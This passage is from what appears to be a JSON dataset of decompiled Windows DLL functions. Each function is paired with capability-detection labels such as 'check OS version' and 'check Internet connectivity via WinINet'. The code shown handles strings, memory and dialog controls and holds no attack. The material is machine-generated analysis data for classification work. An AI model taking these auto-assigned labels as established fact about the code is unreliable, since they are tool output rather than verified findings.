(iVar23 = *(iVar22 + -8),  (iVar22 - iVar23) - 8U < 0x20)) {\n                                fcn.18008fb24(iVar23);\n                                goto code_r0x00018004235a;\n                            }\ncode_r0x000180042d32:\n                            fcn.1800b3528();\n                            goto code_r0x000180042d38;\n                        }\ncode_r0x00018004235a:\n                        ppuStack632 = &puStack696;\n                        puStack680 = NULL;\n                        uStack672 = 0;\n                        puVar18 = arg4[2];\n                        ppuVar15 = arg4;\n                        if (0x7 < arg4[3]) {\n                            ppuVar15 = *arg4;\n                        }\n                        if (puVar18 < 0x8) {\n                            puStack696 = *ppuVar15;\n                            uStack688 = *(ppuVar15 + 1);\n                            uStack684 = *(ppuVar15 + 0xc);\n                            uStack672 = 7;\n                        }\n                        else {\n                            uVar21 = puVar18 | 7;\n                            if (0x7ffffffffffffffe < uVar21) {\n                                uVar21 = 0x7ffffffffffffffe;\n                            }\n                            puStack696 = fcn.180011cf0(&puStack696, uVar21 + 1);\n                            fcn.1800ade80(puStack696, ppuVar15, puVar18 * 2 + 2);\n                            uStack672 = uVar21;\n                        }\n                        ppuStack560 = &puStack664;\n                        iVar23 = iVar12 * 0x20;\n                        puStack680 = puVar18;\n                        uVar13 = fcn.180012870(&puStack664, auStack224._0_8_ + iVar23, 0x1800f8268);\n                        uVar16 = fcn.18000de50(apuStack528, piStack552);\n                        ppuStack712 = &puStack696;\n                        uVar13 = fcn.1800065d0(ppuStack712, &uStack624, uVar16, uVar13);\n                        uVar10 = fcn.1800679c0(uVar13, 10);\n                        iVar22 = iStack592 * 0x60;\n                        *(iVar22 + 0x40 + *piStack568) = uVar10;\n                        if (0xf < uStack600) {\n                            iVar7 = CONCAT62(uStack624._2_6_, uStack624);\n                            iVar29 = iVar7;\n                            if ((0xfff < uStack600 + 1) && (iVar29 = *(iVar7 + -8),  0x1f < (iVar7 - iVar29) - 8U)) {\ncode_r0x000180042d08:\n                                fcn.1800b3528();\n                                pcVar4 = swi(3);\n                                (*pcVar4)();\n                                return;\n                            }\n                            fcn.18008fb24(iVar29);\n                        }\n                        ppuStack632 = &puStack696;\n                        puStack680 = NULL;\n                        uStack672 = 0;\n                        puVar18 = arg4[2];\n                        ppuVar15 = arg4;\n                        if (0x7 < arg4[3]) {\n                            ppuVar15 = *arg4;\n                        }\n                        if (puVar18 < 0x8) {\n                            puStack696 = *ppuVar15;\n                            uStack688 = *(ppuVar15 + 1);\n                            uStack684 = *(ppuVar15 + 0xc);\n                            uStack672 = 7;\n                        }\n                        else {\n                            uVar21 = puVar18 | 7;\n                            if (0x7ffffffffffffffe < uVar21) {\n                                uVar21 = 0x7ffffffffffffffe;\n                            }\n                            puStack696 = fcn.180011cf0(&puStack696, uVar21 + 1);\n                            fcn.1800ade80(puStack696, ppuVar15, puVar18 * 2 + 2);\n                            uStack672 = uVar21;\n                        }\n                        ppuStack560 = apuStack528;\n                        puStack680 = puVar18;\n                        uVar13 = fcn.180012870(apuStack528, auStack224._0_8_ + iVar23, \"_Recursive\");\n                        uVar16 = fcn.18000de50(&puStack664, piStack552);\n                        ppuStack712 = &puStack696;\n                        ppuVar14 = fcn.1800065d0(ppuStack712, &uStack624, uVar16, uVar13);\n                        ppuVar1 = ppuVar14 + 2;\n                        if (0xf < ppuVar14[3]) {\n                            ppuVar14 = *ppuVar14;\n                        }\n                        if (*ppuVar1 == 0x1) {\n                            if (*ppuVar14 == 0x59) {\n                                uVar11 = 0;\n                            }\n                            else {\n                                uVar11 = -(*ppuVar14 < 0x59) | 1;\n                            }\n                            if (uVar11 != 0) goto code_r0x00018004259b;\n                            uVar8 = 1;\n                        }\n                        else {\ncode_r0x00018004259b:\n                            uVar8 = 0;\n                        }\n                        *(iVar22 + 0x44 + *piStack568) = uVar8;\n                        if (0xf < uStack600) {\n                            iVar7 = CONCAT62(uStack624._2_6_, uStack624);\n                            iVar29 = iVar7;\n                            if (0xfff < uStack600 + 1) {\n                                iVar29 = *(iVar7 + -8);\n                                if (0x1f < (iVar7 - iVar29) - 8U) {\n                                    fcn.1800b3528(iVar29, uStack600 + 0x28);\ncode_r0x000180042d14:\n                                    fcn.1800b3528();\ncode_r0x000180042d1a:\n                                    fcn.1800b3528();\n                                    goto code_r0x000180042d20;\n                                }\n                            }\n                            fcn.18008fb24(iVar29);\n                        }\n                        ppuStack632 = &puStack696;\n                        puStack680 = NULL;\n                        uStack672 = 0;\n                        puVar18 = arg4[2];\n                        if (0x7 < arg4[3]) {\n                            arg4 = *arg4;\n                        }\n                        if (puVar18 < 0x8) {\n                            puStack696 = *arg4;\n                            uStack688 = *(arg4 + 1);\n                            uStack684 = *(arg4 + 0xc);\n                            uStack672 = 7;\n                        }\n                        else {\n                            uVar21 = puVar18 | 7;\n                            if (0x7ffffffffffffffe < uVar21) {\n                                uVar21 = 0x7ffffffffffffffe;\n                            }\n                            puStack696 = fcn.180011cf0(&puStack696, uVar21 + 1);\n                            fcn.1800ade80(puStack696, arg4, puVar18 * 2 + 2);\n                            uStack672 = uVar21;\n                        }\n                        ppuStack560 = apuStack528;\n                        puStack680 = puVar18;\n                        uVar13 = fcn.180012870(apuStack528, auStack224._0_8_ + iVar23, \"_EndRecords\");\n                        uVar16 = fcn.18000de50(&uStack624, piStack552);\n                        ppuStack712 = &puStack696;\n                        fcn.1800065d0(ppuStack712, apuStack168, uVar16, uVar13);\n                        _auStack200 = ZEXT816(0);\n                        iStack184 = 0;\n                        puStack648 = NULL;\n                        uStack640 = 0xf;\n                        puStack664 = puStack664 & 0xffffffffffffff00;\n                        ppuVar15 = &puStack664;\n                        fcn.180011120(ppuVar15, 0x1800f7344, 1);\n                        uVar11 = fcn.18000a0f0(ppuVar15, apuStack168, auStack200, &puStack664);\n                        ppuStack560 = ppuStack560 & 0xffffffff00000000 | uVar11;\n                        if (0xf < uStack640) {\n                            puVar18 = puStack664;\n                            if ((0xfff < uStack640 + 1) &&\n                               (puVar18 = puStack664[-1],  0x1f < puStack664 + (-8 - puVar18))) {\ncode_r0x000180042d20:\n                                fcn.1800b3528();\n                                pcVar4 = swi(3);\n                                (*pcVar4)();\n                                return;\n                            }\n                            fcn.18008fb24(puVar18);\n                        }\n                        ppuVar15 = *piStack568 + 0x48 + iVar22;\n                        puVar18 = ppuVar15[1];\n                        puVar17 = *ppuVar15;\n                        ppuStack632 = ppuVar15;\n                        if (puVar17 != puVar18) {\n                            do {\n                                fcn.180042e30(puVar17);\n                                puVar17 = puVar17 + 8;\n                            } while (puVar17 != puVar18);\n                            puVar17 = *ppuVar15;\n                        }\n                        ppuVar15[1] = puVar17;\n                        fcn.180048c70(ppuVar15, uVar11);\n                        uVar28 = 0;\n                        uVar21 = uVar28;\n                        uVar30 = uVar28;\n                        if (0 < uVar11) {\n                            do {\n                                puVar27 = auStack200 + uVar30;\n                                puStack648 = NULL;\n                                uStack640 = 0xf;\n                                puStack664 = puStack664 & 0xffffffffffffff00;\n                                if (puVar27[2] < 3) {\n                                    fcn.180011cd0();\n                                    goto code_r0x000180042d2c;\n                                }\n                                iVar22 = puVar27[2] - 3;\n                                iVar23 = -1;\n                                if (iVar22 != -1) {\n                                    iVar23 = iVar22;\n                                }\n                                if (0xf < puVar27[3]) {\n                                    puVar27 = *puVar27;\n                                }\n                                fcn.180011120(&puStack664, puVar27 + 3, iVar23);\n                                uStack584 = uVar26 | 0x1000;\n                                iVar12 = fcn.1800679c0(&puStack664, 10);\n                                if (0xf < uStack640) {\n                                    puVar18 = puStack664;\n                                    if ((0xfff < uStack640 + 1) &&\n                                       (puVar18 = puStack664[-1],  0x1f < puStack664 + (-8 - puVar18)))\n                                    goto code_r0x000180042d14;\n                                    fcn.18008fb24(puVar18);\n                                }\n                                puStack648 = NULL;\n                                uStack640 = 0xf;\n                                puStack664 = puStack664 & 0xffffffffffffff00;\n                                ppuVar20 = auStack200 + uVar30;\n                                if (*ppuVar15 + uVar28 * 8 != ppuVar20) {\n                                    ppuVar3 = ppuVar20 + 2;\n                                    if (0xf < ppuVar20[3]) {\n                                        ppuVar20 = *ppuVar20;\n                                    }\n                                    fcn.180011120(*ppuVar15 + uVar28 * 8, ppuVar20, *ppuVar3);\n                                }\n                                if (iVar12 + -1 < var_60h) {\n                                    ppuVar15 = (iVar12 + -1) * 0x40 + 0x20 + *(iStack544 + 0xa8);\n                                    puVar18 = ppuVar15[2];\n                                    if (0x7 < ppuVar15[3]) {\n                                        ppuVar15 = *ppuVar15;\n                                    }\n                                    if (puVar18 < 0x8) {\n                                        puStack696 = *ppuVar15;\n                                        uStack688 = *(ppuVar15 + 1);\n                                        uStack684 = *(ppuVar15 + 0xc);\n                                        uVar25 = 7;\n                                    }\n                                    else {\n                                        uVar25 = puVar18 | 7;\n                                        if (0x7ffffffffffffffe < uVar25) {\n                                            uVar25 = 0x7ffffffffffffffe;\n                                        }\n                                        puStack696 = fcn.180011cf0(&puStack696, uVar25 + 1);\n                                        fcn.1800ade80(puStack696, ppuVar15, puVar18 * 2 + 2);\n                                    }\n                                    uStack672 = uVar25;\n                                    puStack680 = puVar18;\n                                    ppuVar15 = &puStack696;\n                                    uVar26 = uVar26 | 0x1008;\n                                }\n                                else {\n                                    puVar24 = auStack200 + uVar30;\n                                    uVar13 = fcn.1800687b0(auStack360);\n                                    puVar27 = puVar24;\n                                    if (0xf < puVar24[3]) {\n                                        puVar27 = *puVar24;\n                                    }\n                                    fcn.180069050(uVar13, &uStack624, puVar27, puVar24[2] + puVar27);\n                                    fcn.1800686c0(auStack360);\n                                    ppuVar15 = &uStack624;\n                                    uVar26 = uVar26 | 0x7004;\n                                }\n                                ppuVar20 = *ppuStack632 + uVar21 + 0x20;\n                                if (ppuVar20 != ppuVar15) {\n                                    if (0x7 < ppuVar20[3]) {\n                                        puVar18 = *ppuVar20;\n                                        puVar17 = puVar18;\n                                        if ((0xfff < ppuVar20[3] * 2 + 2U) &&\n                                           (puVar17 = puVar18[-1],  0x1f < puVar18 + (-8 - puVar17)))\n                                        goto code_r0x000180042d1a;\n                                        fcn.18008fb24(puVar17);\n                                    }\n                                    ppuVar20[2] = NULL;\n                                    ppuVar20[3] = 0x7;\n                                    uVar10 = *(ppuVar15 + 4);\n                                    uVar5 = *(ppuVar15 + 1);\n                                    uVar6 = *(ppuVar15 + 0xc);\n                                    *ppuVar20 = *ppuVar15;\n                                    *(ppuVar20 + 4) = uVar10;\n                                    *(ppuVar20 + 1) = uVar5;\n                                    *(ppuVar20 + 0xc) = uVar6;\n                                    uVar10 = *(ppuVar15 + 0x14);\n                                    uVar5 = *(ppuVar15 + 3);\n                                    uVar6 = *(ppuVar15 + 0x1c);\n                                    *(ppuVar20 + 2) = *(ppuVar15 + 2);\n                                    *(ppuVar20 + 0x14) = uVar10;\n                                    *(ppuVar20 + 3) = uVar5;\n                                    *(ppuVar20 + 0x1c) = uVar6;\n                                    ppuVar15[2] = NULL;\n                                    ppuVar15[3] = 0x7;\n                                    *ppuVar15 = 0;\n                                }\n                                if (((uVar26 & 8) != 0) && (uVar26 = uVar26 & 0xfffffff7,  7 < uStack672)) {\n                                    puVar18 = puStack696;\n                                    if ((0xfff < uStack672 * 2 + 2) &&\n                                       (puVar18 = puStack696[-1],  0x1f < puStack696 + (-8 - puVar18)))\n                                    goto code_r0x000180042d1a;\n                                    fcn.18008fb24(puVar18);\n                                }\n                                if (((uVar26 & 4) != 0) && (uVar26 = uVar26 & 0xfffffffb,  7 < uStack600)) {\n                                    iVar22 = CONCAT62(uStack624._2_6_, uStack624);\n                                    iVar23 = iVar22;\n                                    if ((0xfff < uStack600 * 2 + 2) &&\n                                       (iVar23 = *(iVar22 + -8),  0x1f < (iVar22 - iVar23) - 8U))\n                                    goto code_r0x000180042d20;\n                                    fcn.18008fb24(iVar23);\n                                }\n                                uVar11 = uVar28 + 1;\n                                uVar28 = uVar11;\n                                uVar21 = uVar21 + 0x40;\n                                ppuVar15 = ppuStack632;\n                                uVar30 = uVar30 + 0x20;\n                            } while (uVar11 < ppuStack560);\n                        }\n                        if (auStack200 != NULL) {\n                            fcn.180013b30(auStack200, uStack192);\n                            puVar18 = auStack200;\n                            if ((0xfff < (iStack184 - auStack200 & 0xffffffffffffffe0U)) &&\n                               (puVar18 = auStack200[-1],  0x1f < auStack200 + (-8 - puVar18))) {\ncode_r0x000180042d2c:\n                                fcn.1800b3528();\n                                goto code_r0x000180042d32;\n                            }\n                            fcn.18008fb24(puVar18);\n                            _auStack200 = extraout_XMM0 & 0x0;\n                            iStack184 = 0;\n                        }\n                        if (0xf < uStack144) {\n                            puVar18 = apuStack168[0];\n                            if ((0xfff < uStack144 + 1) &&\n                               (puVar18 = apuStack168[0][-1],  0x1f < apuStack168[0] + (-8 - puVar18)))\n                            goto code_r0x000180042d32;\n                            fcn.18008fb24(puVar18);\n                        }\n                        iStack576 = iStack576 + 1;\n                        iStack592 = iStack592 + 1;\n                        arg3 = piStack552;\n                        arg4 = ppuStack536;\n                        ppuVar15 = var_60h;\n                    } while (iStack592 < iStack572);\n                }\n                if (auStack224._0_8_ != 0) {\n                    fcn.180013b30(auStack224._0_8_, auStack224._8_8_);\n                    iVar23 = auStack224._0_8_;\n                    if ((0xfff < (iStack208 - auStack224._0_8_ & 0xffffffffffffffe0U)) &&\n                       (iVar23 = *(auStack224._0_8_ + -8),  0x1f < (auStack224._0_8_ - iVar23) - 8U)) {\ncode_r0x000180042d38:\n                        fcn.1800b3528();\ncode_r0x000180042d3e:\n                        fcn.180011cd0();\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                    fcn.18008fb24(iVar23);\n                    auStack224 = extraout_XMM0_00 & 0x0;\n                    iStack208 = 0;\n                }\n                if (0xf < var_bp_68h) {\n                    iVar22 = CONCAT71(Stack135, uStack136);\n                    iVar23 = iVar22;\n                    if (0xfff < var_bp_68h + 1) {\n                        iVar29 = var_bp_68h + 0x28;\n                        iVar23 = *(iVar22 + -8);\n                        if (0x1f < (iVar22 - iVar23) - 8U) goto code_r0x000180042ccc;\n                    }\n                    fcn.18008fb24(iVar23);\n                }\n                var_bp_70h = CONCAT44(*0x180101914, *0x180101910);\n                var_bp_68h = CONCAT44(*0x18010191c, *0x180101918);\n                uStack136 = 0;\n                if (arg3[3] < 0x10) {\ncode_r0x000180042c94:\n                    arg3[2] = 0;\n                    arg3[3] = 0xf;\n                    *arg3 = 0;\n                    fcn.18008fb00(stack0xffffffffffffffa8 ^ auStack744);\n                    return;\n                }\n                iVar23 = *arg3;\n                iVar22 = iVar23;\n                if ((arg3[3] + 1U < 0x1000) || (iVar22 = *(iVar23 + -8),  (iVar23 - iVar22) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar22);\n                    goto code_r0x000180042c94;\n                }\n            }\n            fcn.1800b3528();\n            goto code_r0x000180042cd8;\n        }\n        puVar18 = puStack664;\n        if ((uStack640 + 1 < 0x1000) || (puVar18 = puStack664[-1],  puStack664 + (-8 - puVar18) < 0x20)) {\n            fcn.18008fb24(puVar18);\n            goto code_r0x000180041cde;\n        }\n    }\n    else {\n        puVar18 = apuStack168[0];\n        if ((uStack144 + 1 < 0x1000) || (puVar18 = apuStack168[0][-1],  apuStack168[0] + (-8 - puVar18) < 0x20)) {\n            fcn.18008fb24(puVar18);\n            goto code_r0x000180041b8c;\n        }\ncode_r0x000180042cd8:\n        fcn.1800b3528();\ncode_r0x000180042cde:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180042cea:\n    fcn.1800b3528();\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 9941
    },
    "18004307": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180043070(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    ulong uVar9;\n    ulong uVar10;\n    uint uVar11;\n    char cVar12;\n    int64_t iVar13;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    ulong uStack80;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint64_t uVar14;\n    \n    if (((*(arg1 + 0x52) == '\\0') || (*(arg1 + 0x53) == '\\0')) || (*(arg1 + 0x54) == '\\0')) {\n        cVar12 = '\\0';\n    }\n    else {\n        cVar12 = '\\x01';\n    }\n    uStack80 = 0x1800430be;\n    iVar7 = (**0x1800de7f0)(*(arg1 + 0x58), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x52);\n    iVar13 = *(arg1 + 0x98) - *(arg1 + 0x90) >> 6;\n    uStack80 = 0x1800430f1;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x27e2);\n    uStack80 = 0x1800430fc;\n    (**0x1800de718)(uVar8, -(cVar2 != '\\0') & 5);\n    uVar11 = 5;\n    if (*(arg1 + 0x52) != '\\0') {\n        uVar11 = 0;\n    }\n    uStack80 = 0x18004311b;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x27e1);\n    uStack80 = 0x180043126;\n    (**0x1800de718)(uVar8, uVar11);\n    uStack80 = 0x180043137;\n    (**0x1800de770)(*(arg1 + 0x58), cVar12);\n    uStack80 = 0x18004314f;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x27df);\n    uStack80 = 0x18004315a;\n    (**0x1800de770)(uVar8, iVar13 != 0);\n    uStack80 = 0x180043169;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x27e0);\n    uStack80 = 0x180043174;\n    (**0x1800de770)(uVar8, iVar13 != 0);\n    uVar8 = 1;\n    if ((iVar13 == 0) || (uVar10 = uVar8,  cVar12 == '\\0')) {\n        uVar10 = 0;\n    }\n    uStack80 = 0x180043196;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x27e2);\n    uStack80 = 0x1800431a1;\n    (**0x1800de770)(uVar9, uVar10);\n    if ((iVar13 == 0) || (cVar12 == '\\0')) {\n        uVar8 = 0;\n    }\n    uStack80 = 0x1800431bd;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x27e3);\n    uStack80 = 0x1800431c8;\n    (**0x1800de770)(uVar10, uVar8);\n    uStack80 = 0x1800431db;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x27e4);\n    uStack80 = 0x1800431e6;\n    (**0x1800de770)(uVar8, 0 < iVar7);\n    uStack80 = 0x1800431f5;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x2819);\n    uStack80 = 0x180043201;\n    (**0x1800de770)(uVar8, cVar12);\n    uStack80 = 0x180043210;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x281a);\n    uStack80 = 0x18004321c;\n    (**0x1800de770)(uVar8, cVar12);\n    if (cVar12 == '\\0') {\n        uStack80 = 0x18004323a;\n        uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x27db);\n        uStack80 = 0x180043245;\n        (**0x1800de770)(uVar8, 0);\n        uStack80 = 0x180043254;\n        uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x27dc);\n        uStack80 = 0x18004325f;\n        (**0x1800de770)(uVar8, 0);\n    }\n    else {\n        uStack80 = 0x180043229;\n        fcn.180042fb0(arg1);\n    }\n    if (*(arg1 + 0x51) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f8150, 0x1d);\n        uVar14 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar6 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f6ffc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar5 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar5 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar5 + uVar14 * 2) = 0x2a;\n            *(puVar5 + uVar1 * 2) = 0;\n            puVar6 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar6;\n        uStack54 = *puVar6 >> 0x10;\n        uStack52 = puVar6[1];\n        uStack48 = puVar6[2];\n        uStack44 = puVar6[3];\n        uVar14 = *(puVar6 + 6);\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 7;\n        *puVar6 = 0;\n        puVar5 = &stack0xffffffffffffffc8;\n        if (7 < uVar14) {\n            puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, puVar5);\n        if (uVar14 < 8) {\ncode_r0x0001800407a3:\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x0001800407f4:\n                fcn.180068600(*(arg1 + 0x18), 0x2815);\n                goto code_r0x000180040802;\n            }\n            iVar13 = CONCAT62(Stack86, uStack88);\n            iVar7 = iVar13;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar7 = *(iVar13 + -8),  (iVar13 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x0001800407f4;\n            }\n        }\n        else {\n            iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar7 = iVar13;\n            if ((uVar14 * 2 + 2 < 0x1000) || (iVar7 = *(iVar13 + -8),  (iVar13 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x0001800407a3;\n            }\ncode_r0x000180040cb5:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x000180040cc1:\n        fcn.1800b3528();\ncode_r0x000180040cc7:\n        fcn.1800b3528();\ncode_r0x000180040ccd:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, 0x1800f8110);\n        fcn.180068540(*(arg1 + 0x18), 0x2815);\ncode_r0x000180040802:\n        if (*(arg1 + 0x52) == '\\0') {\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81a0, 6);\n            uVar14 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar6 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f70c4);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar5 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar5 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar5 + uVar14 * 2) = 0x2a;\n                *(puVar5 + uVar1 * 2) = 0;\n                puVar6 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar6;\n            uStack54 = *puVar6 >> 0x10;\n            uStack52 = puVar6[1];\n            uStack48 = puVar6[2];\n            uStack44 = puVar6[3];\n            uVar14 = *(puVar6 + 6);\n            *(puVar6 + 4) = 0;\n            *(puVar6 + 6) = 7;\n            *puVar6 = 0;\n            puVar5 = &stack0xffffffffffffffc8;\n            if (7 < uVar14) {\n                puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x27e0, puVar5);\n            if (7 < uVar14) {\n                iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar7 = iVar13;\n                if ((uVar14 * 2 + 2 < 0x1000) || (iVar7 = *(iVar13 + -8),  (iVar13 - iVar7) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar7);\n                    goto code_r0x00018004092b;\n                }\n                goto code_r0x000180040cc1;\n            }\ncode_r0x00018004092b:\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018004097c:\n                fcn.180068600(*(arg1 + 0x18), 0x27e0);\n                goto code_r0x00018004098a;\n            }\n            iVar13 = CONCAT62(Stack86, uStack88);\n            iVar7 = iVar13;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar7 = *(iVar13 + -8),  (iVar13 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x00018004097c;\n            }\n            goto code_r0x000180040cc7;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27e0, 0x1800f8190);\n        fcn.180068540(*(arg1 + 0x18), 0x27e0);\ncode_r0x00018004098a:\n        if (*(arg1 + 0x53) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x27f6, 0x1800f81b0);\n            fcn.180068540(*(arg1 + 0x18), 0x27f6);\ncode_r0x000180040b12:\n            if (*(arg1 + 0x54) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x2807, 0x1800f81d0);\n                fcn.180068540(*(arg1 + 0x18), 0x2807);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81e0, 6);\n            uVar14 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar6 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f7134);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar5 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar5 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar5 + uVar14 * 2) = 0x2a;\n                *(puVar5 + uVar1 * 2) = 0;\n                puVar6 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar6;\n            uStack54 = *puVar6 >> 0x10;\n            uStack52 = puVar6[1];\n            uStack48 = puVar6[2];\n            uStack44 = puVar6[3];\n            uVar14 = *(puVar6 + 6);\n            *(puVar6 + 4) = 0;\n            *(puVar6 + 6) = 7;\n            *puVar6 = 0;\n            puVar5 = &stack0xffffffffffffffc8;\n            if (7 < uVar14) {\n                puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x2807, puVar5);\n            if (7 < uVar14) {\n                iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar7 = iVar13;\n                if ((0xfff < uVar14 * 2 + 2) && (iVar7 = *(iVar13 + -8),  0x1f < (iVar13 - iVar7) - 8U))\n                goto code_r0x000180040cd9;\n                fcn.18008fb24(iVar7);\n            }\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) goto code_r0x000180040c88;\n            iVar7 = CONCAT44(uStack60, uStack64) * 2;\n            iVar4 = CONCAT62(Stack86, uStack88);\n            iVar13 = iVar4;\n            if (0xfff < iVar7 + 2U) {\n                iVar13 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar13) - 8U) {\n                    fcn.1800b3528(CONCAT44(*0x180101904, *0x180101900), iVar13, iVar7 + 0x29);\n                    goto code_r0x000180040cb5;\n                }\n            }\n            fcn.18008fb24(iVar13);\ncode_r0x000180040c88:\n            fcn.180068600(*(arg1 + 0x18), 0x2807);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f81c0, 6);\n        uVar14 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar6 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f70dc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar5 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar5 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar5 + uVar14 * 2) = 0x2a;\n            *(puVar5 + uVar1 * 2) = 0;\n            puVar6 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar6;\n        uStack54 = *puVar6 >> 0x10;\n        uStack52 = puVar6[1];\n        uStack48 = puVar6[2];\n        uStack44 = puVar6[3];\n        uVar14 = *(puVar6 + 6);\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 7;\n        *puVar6 = 0;\n        puVar5 = &stack0xffffffffffffffc8;\n        if (7 < uVar14) {\n            puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27f6, puVar5);\n        if (7 < uVar14) {\n            iVar13 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar7 = iVar13;\n            if ((uVar14 * 2 + 2 < 0x1000) || (iVar7 = *(iVar13 + -8),  